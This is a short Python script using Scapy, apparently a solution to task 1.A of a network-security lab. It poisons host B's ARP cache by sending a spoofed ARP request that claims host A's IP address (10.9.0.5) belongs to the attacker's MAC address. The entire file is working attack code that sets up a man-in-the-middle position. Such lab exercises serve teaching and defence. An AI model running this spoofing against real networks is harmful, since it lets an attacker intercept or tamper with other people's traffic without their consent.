#!/usr/bin/env python3
# Task 1.A -- poison B's ARP cache with a spoofed ARP request.
# B learns that 10.9.0.5 (A) is at M's MAC.
from scapy.all import *

IP_A = '10.9.0.5'
IP_B = '10.9.0.6'
mac_M = get_if_hwaddr('eth0')
mac_B = getmacbyip(IP_B)

E = Ether(src=mac_M, dst=mac_B)
A = ARP(op=1, hwsrc=mac_M, psrc=IP_A, hwdst=mac_B, pdst=IP_B)
sendp(E/A)
